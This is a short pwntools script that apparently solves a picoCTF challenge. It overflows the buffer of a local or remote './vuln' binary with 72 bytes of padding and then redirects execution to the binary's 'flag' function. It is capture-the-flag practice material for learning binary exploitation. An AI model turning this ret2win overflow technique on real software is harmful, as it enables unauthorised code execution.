#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("saturn.picoctf.net", 49582)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

flag_func_addr = elf.symbols['flag']

payload = b""
payload += b"A" * 64
payload += b"B" * 8# saved rbp
payload += p64(flag_func_addr + 0x5)

p.recvuntil(":")
sleep(0.5)
p.sendline(payload)

p.interactive()
